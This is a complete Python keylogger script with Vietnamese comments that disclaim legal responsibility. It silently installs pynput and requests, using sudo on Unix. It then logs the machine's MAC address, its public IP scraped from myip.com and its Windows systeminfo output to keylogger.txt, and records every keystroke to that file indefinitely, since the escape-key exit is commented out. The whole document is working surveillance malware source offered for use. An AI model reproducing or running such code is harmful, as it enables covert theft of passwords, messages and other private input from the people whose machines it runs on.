#!/usr/bin/python3
# -*- coding: utf-8 -*-
#source by Phúc
#mọi hành động nếu liên quan đến vi pháp luật chúng tôi sẽ ko chịu trách nhiệm về hành vi đó 
#tôi cũng ko chịu trách nhiệm nếu như bạn bỏ qua dòng note này
import os, logging
import re, subprocess
from uuid import getnode
from sys import platform
try:
    import pynput, requests
    from pynput.keyboard import Key, Listener
except ImportError:
    if platform == "win32":
        try:
            os.system("pip install pynput requests")
        except:
            os.system("python -m pip install pynput requests")
    elif platform == "linux" or platform == "linux2" or platform == "darwin":
        try:
            os.system("sudo pip install pynput requests")
        except:
            os.system("python -m pip install pynput requests")

original_mac_address = getnode()
filenames = "keylogger.txt"
def Filenames():
    mac_address = "MAC Address: " + str(original_mac_address)
    hex_mac_address = str(":".join(re.findall('..','%012x'%original_mac_address)))
    hex_address = "HEX MAC Address: " + str(hex_mac_address)
    with open(filenames,"a",encoding="utf-8") as file:
             file.write("="*25+"System Information"+"="*25+'\n')
             file.write(mac_address+'\n'+hex_address+'\n')
             file.close()
Filenames()

def Logfiles():
    log_dir = ""
    logging.basicConfig(filename=(log_dir + filenames), 
                        format='\r%(asctime)s: %(message)s',
                        level=logging.DEBUG,encoding="utf-8")
def IpAddress():
    try:
        data_ip = requests.get("https://www.myip.com/")
        if data_ip.status_code == 200:
            ip_add = str(data_ip.content).split('<span id="ip">')
            if len(ip_add) > 1:
                ip_add = ip_add[1].split('</span>\\n')
                if len(ip_add) > 0:
                    ip_add = "Ip Address: " + ip_add[0]
                    with open(filenames, "a", encoding="utf-8") as file:
                        file.write(ip_add + '\n\n')
                        file.close()
                else:
                    print("Không thể lấy địa chỉ IP.")
            else:
                print("Không tìm thấy phần tử chứa địa chỉ IP trong phản hồi.")
        else:
            print("Không thể lấy dữ liệu, mã trạng thái:", data_ip.status_code)
    except Exception as e:
        print("Đã xảy ra lỗi:", e)

IpAddress()

def SystemInfo():
    system = subprocess.check_output(['systeminfo']).decode('utf-8').split('\n')
    newlogs = []
    for item in system:
        newlogs.append(str(item.split("\r")[:-1]))
    for info in newlogs:
        infosys = str(info[2:-2])
        Logfiles()
        logging.info(str(infosys))
SystemInfo()

def Keyboard(key):
    key = str(key)
    key = key.replace("'","")
    Logfiles()
    logging.info(str(key))
    '''
    if key =="Key.esc":
       raise SystemExit(0)
    '''
with Listener(on_press=Keyboard) as listener:
     listener.join()
